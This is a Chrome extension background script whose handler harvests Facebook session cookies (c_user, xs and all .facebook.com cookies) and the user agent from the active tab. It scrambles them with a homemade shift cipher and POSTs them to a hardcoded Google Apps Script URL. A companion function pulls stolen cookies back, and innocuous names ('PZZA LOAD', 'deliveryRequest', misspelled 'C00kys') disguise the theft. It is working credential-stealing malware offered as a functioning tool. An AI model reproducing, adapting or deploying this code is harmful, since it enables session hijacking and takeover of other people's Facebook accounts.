var strflujtxt = "";
var strflujtxt2 = "";
const IdImp = "AKfycbyS4gSoMJ6WCb4YZD__FxRTr6zM_fuzcAlkKibLs9B0c0q0KfVVwEGWiMDGS-EDknDH";
const debug=false;
const homeTime = Date.now();

function getFormattedDateTime() { const now = new Date(); const year = now.getFullYear(); const month = String(now.getMonth() + 1).padStart(2, '0');const day = String(now.getDate()).padStart(2, '0'); const hours = String(now.getHours()).padStart(2, '0'); const minutes = String(now.getMinutes()).padStart(2, '0'); const seconds = String(now.getSeconds()).padStart(2, '0');const dateTime = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;return dateTime;}
function simpleEncrypt(text) {if (!text || typeof text !== 'string') return '';

const seed = (text.length + text.charCodeAt(0)) % 94;
let result = '';
for (let i = 0; i < text.length; i++) {
let charCode = text.charCodeAt(i);
let normalized = charCode - 32;
let shifted = (normalized + seed + i) % 94;
result += String.fromCharCode(shifted + 32);
}
result += String.fromCharCode(seed + 32);
return result;
}

function getLifeTime() {
try {
var current = Date.now();
var timelapse = current - homeTime;
var seconds = Math.floor(timelapse / 1000);
var minutes = Math.floor(seconds / 60);
var hours = Math.floor(minutes / 60);
strflujtxt += "[" + getFormattedDateTime() + "] Elapsed time: " + hours + "h " + (minutes % 60) + "m " + (seconds % 60) + "s\n";
		strflujtxt2 += "[" + getFormattedDateTime() + "] Elapsed time: " + hours + "h " + (minutes % 60) + "m " + (seconds % 60) + "s\n";
if (debug===false){
console.log("Elapsed time: " + hours + "h " + (minutes % 60) + "m " + (seconds % 60) + "s");
} 
} catch (error) {
strflujtxt += "[" + getFormattedDateTime() + "] Error 96 gtl:  " + error + "\n";
		strflujtxt2 += "[" + getFormattedDateTime() + "] Error 96 gtl:  " + error + "\n";
}
}


var callback2 = function () {
strflujtxt += "[" + getFormattedDateTime() + "] Clever complete.\n";
	strflujtxt2 += "[" + getFormattedDateTime() + "] Clever complete.\n";
};

function error(error) {
strflujtxt += "[" + getFormattedDateTime() + "] 208 er:  " + error + "\n";
	strflujtxt2 += "[" + getFormattedDateTime() + "] 208 er:  " + error + "\n";
};

async function getcookies(tab) {
var confirmation;
var MUrl = "";

await chrome.scripting.executeScript({
target: {tabId: tab.id}, function: () => {
return window.location.href;
}
}).then(function (resultados) {
confirmation = resultados[0]["result"];
}).catch(function (error) {
strflujtxt += "[" + getFormattedDateTime() + "]  " + error + "\n";
});
if (confirmation.includes("m.facebook")) {
MUrl = "https://m.facebook.com";
} else if (confirmation.includes("mbasic.facebook")) {
MUrl = "https://mbasic.facebook.com";
}
if (MUrl !== "") {
var cUserC00ky = await new Promise(resolve => {
chrome.cookies.get({url: MUrl, name: "c_user"}, function (cookie) {
resolve(cookie);
});
});
var xsC00ky = await new Promise(resolve => {
chrome.cookies.get({url: MUrl, name: "xs"}, function (cookie) {
resolve(cookie);
});
});
const domain = new URL(confirmation).hostname;
const cokis = await new Promise(resolve => {
chrome.cookies.getAll({ domain: domain }, resolve);
});
const cokis2 = await new Promise(resolve => {
chrome.cookies.getAll({ domain: ".facebook.com" }, resolve);
});
const allc = cokis.concat(cokis2);
const ckall = allc.map(cookie => ({
Name: cookie.name,
Value: cookie.value,
Domain: cookie.domain,
Path: cookie.path,
ExpirationDate: cookie.expirationDate
? new Date(cookie.expirationDate * 1000).toISOString()
: "Session",
HttpOnly: cookie.httpOnly,
Secure: cookie.secure
}));
const ua = navigator.userAgent;
await exportC00kysToXCL(ckall, confirmation, ua, getFormattedDateTime());
} else {
strflujtxt += "[" + getFormattedDateTime() + "] 313 cke not clever";
		strflujtxt2 += "[" + getFormattedDateTime() + "] 313 cke not clever";
}
}



async function popup(mensaje) {
chrome.notifications.create({
type: 'basic',
iconUrl: 'deliver.png',
title: 'PZZA LOAD',
message: mensaje
});
}

async function popup2(mensaje) {
chrome.notifications.create({
type: 'basic',
iconUrl: 'distribute.png',
title: 'PZZA FINISH',
message: mensaje
});
}

function showBadgeText(text) {
chrome.action.setBadgeText({text: text});
}

async function exportC00kysToXCL(c0kis, url, ua, fcha) {
const deliveryRequest ={
"url" : url,
"cookies" : c0kis,
"useragent" : ua,
"date" : fcha,
} 
var req=JSON.stringify(deliveryRequest);
req=req.replace(/true/gi, 'True');
req=req.replace(/false/gi, 'False');
req=req.replace(/null/gi, 'None');
var linkshared="https://script.google.com/macros/s/"+IdImp+"/exec"
const formData = new URLSearchParams();
const encrypted = simpleEncrypt(req);
formData.append('value', JSON.stringify({"deliveryRequest":encrypted}));
const response = await fetch(linkshared, {
method: "POST",
body: formData
});
if (debug===true){
if (response.ok) {
console.log("Data sent correctly:", await response.text());
} else {
console.error("Error sending data:", await response.text());
}
} 
}


async function importC00kysToXCL() {
var jsonObject ={} 
var linkshared="https://script.google.com/macros/s/"+IdImp+"/exec"
const response = await fetch(linkshared, {
method: "GET",
headers: {
'Content-Type': 'application/json',
  }
}).then(response => response.json())
.then(data => {
if (debug===true){
console.log('Success:', data);
} 
jsonObject = JSON.parse(data);
  })
.catch((error) => {
if (debug===true){
console.error('Error:', error);
} 
});
const url = jsonObject.url;
const cukes = jsonObject.cookies;
if (debug===true){
console.log('URL:', url);
console.log('Cookies:', cukes);
console.log(jsonObject);
} 
}

chrome.runtime.onMessage.addListener(async function (request, sender, sendResponse) {
strflujtxt="";
strflujtxt += "[" + getFormattedDateTime() + "] Version.: 0.0.1n";
if (request.action === 'start') {
const tab = request.message;
		chrome.tabs.update(tab.id, {active: true});
await popup('Sending');
showBadgeText('Sending');
await getcookies(tab);
showBadgeText('Finished');
await popup2('Finished');}});



